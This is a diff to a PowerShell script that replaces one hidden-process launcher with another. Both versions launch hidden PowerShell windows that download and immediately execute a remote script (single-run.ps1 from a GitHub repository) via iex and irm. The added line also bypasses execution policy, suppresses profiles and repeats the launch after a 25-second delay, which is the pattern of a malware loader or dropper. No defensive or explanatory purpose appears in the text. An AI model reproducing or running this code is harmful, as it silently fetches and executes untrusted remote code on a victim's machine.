@@ -1,8 +1,1 @@
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "powershell.exe"
-$psi.Arguments = "-Command `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`""
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-
-# Start two processes concurrently
-$process1 = [System.Diagnostics.Process]::Start($psi)
-$process2 = [System.Diagnostics.Process]::Start($psi)
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden; Start-Sleep 25; Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden
